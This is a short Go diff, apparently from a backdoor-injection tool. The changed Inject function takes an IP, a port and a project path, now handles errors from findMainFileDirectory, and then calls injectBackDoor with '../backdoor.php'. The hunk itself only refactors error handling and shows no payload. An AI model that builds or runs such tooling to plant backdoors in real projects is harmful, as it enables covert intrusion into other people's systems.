@@ -13,7 +13,11 @@ func findModuleName(path string) string {
 
 func Inject(ip string, port uint16, path string) error {
 	var moduleName string = findModuleName(path)
-	var mainFile string = findMainFileDirectory(moduleName)
+
+	mainFile, err := findMainFileDirectory(path, moduleName)
+	if err != nil {
+		return err
+	}
 
 	return injectBackDoor(mainFile, "../backdoor.php")
 }
